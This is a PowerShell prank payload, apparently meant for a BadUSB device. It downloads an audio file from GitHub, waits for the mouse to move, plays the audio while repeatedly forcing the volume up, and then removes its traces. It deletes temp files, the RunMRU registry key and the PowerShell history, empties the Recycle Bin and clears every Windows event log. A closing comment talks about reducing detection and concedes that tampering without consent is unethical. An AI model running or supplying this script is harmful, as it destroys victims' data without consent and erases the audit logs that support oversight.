$wav = "https://github.com/MajorMarmalade/Sounds/blob/main/VeryBadPrank/ytmp3freecc-asmr-s-love-in-the-shower-youtubemp3freeorg_Ejxl9Sel.wav?raw=true"

$w = -join($wav,"?dl=1")
iwr $w -O $env:TMP\s.wav

Add-Type -AssemblyName PresentationCore
$mediaPlayer = New-Object System.Windows.Media.MediaPlayer
$mediaPlayer.Open([System.Uri]"file:///$env:TMP\s.wav")
$mediaPlayer.Play()

Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [System.Windows.Forms.Cursor]::Position

while (1) {
    if ([Windows.Forms.Cursor]::Position -ne $originalPOS) {
        break
    }
}

function Raise-Volume {
    $k=[Math]::Ceiling(100/2)
    $o=New-Object -ComObject WScript.Shell
    for($i = 0;$i -lt $k;$i++) {
        $o.SendKeys([char] 175)
    }
}

while ($mediaPlayer.Position -lt $mediaPlayer.NaturalDuration.TimeSpan) {
    Raise-Volume
    Start-Sleep -Milliseconds 200
}

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
Remove-Item (Get-PSreadlineOption).HistorySavePath
Clear-RecycleBin -Force -ErrorAction SilentlyContinue

# Clear event logs
Get-EventLog -LogName * | ForEach { Clear-EventLog -LogName $_.Log }

# Reset system volume to a safe level
$o=New-Object -ComObject WScript.Shell
for($i = 0;$i -lt 25;$i++) {
    $o.SendKeys([char] 174)
}

#Keep in mind that while these additional steps may help reduce the chances of detection, absolute undetectability cannot be guaranteed. Furthermore, tampering with a user's system or data without their consent is unethical and potentially illegal. Please exercise caution and ensure compliance with applicable laws and regulations.
